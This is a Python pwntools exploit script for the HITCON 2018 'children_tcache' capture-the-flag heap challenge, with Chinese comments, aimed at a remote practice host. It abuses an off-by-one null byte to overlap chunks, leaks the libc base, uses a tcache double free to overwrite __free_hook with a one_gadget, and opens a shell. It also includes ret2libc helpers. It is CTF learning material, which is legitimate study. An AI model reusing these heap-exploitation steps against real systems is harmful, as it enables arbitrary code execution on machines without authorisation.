from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './HITCON_2018_children_tcache'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',29002) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b':',b'1')
    sla(b'Size:',int2bytes(len))
    sla(b'Data:',content)

def show(index):
    sla(b':',b'2')
    sla(b':',int2bytes(index))


def delete(index):
    sla(b':',b'3')
    sla(b':',int2bytes(index))

one_gadgets = [0x4f2c5,0x4f322,0x10a38c]

add(0x410,b's')#0
add(0x68,b'k')#1
add(0x4f0,b'y')#2
add(0x60,b'e')#3

delete(0)
delete(1)
#用null_by_off清空pre_size位
for i in range(9):
    add(0x68 - i, b'a' * (0x68 - i))#0
    delete(0)

add(0x68,b'a'*0x60 + p64(0x490))#0
delete(2)
#向前extend null by off经典用法
#此时chunk0，chunk1，chunk2合并成一个大堆块，但是实际上chunk0指针并没有被清除
#即另类的uaf
add(0x410)#1

show(0)
libc_base = uu64(ru('\x7f',drop=False)[-6:]) - 96 - 0x10 - libc.sym['__malloc_hook']
log.success('libc_base '+ hex(libc_base))
one_gadget = libc_base + one_gadgets[1]
free_hook = libc_base + libc.sym['__free_hook']

add(0x68)#2
#double free -- 此时原本的chunk0指针和从合并大堆块中分离出来的chunk2指向同一个地址
delete(0)
delete(2)
payload = p64(free_hook)
add(0x68, payload)
add(0x68, payload)
add(0x68, p64(one_gadget))

#触发malloc_hook
delete(0)
itr()
# end

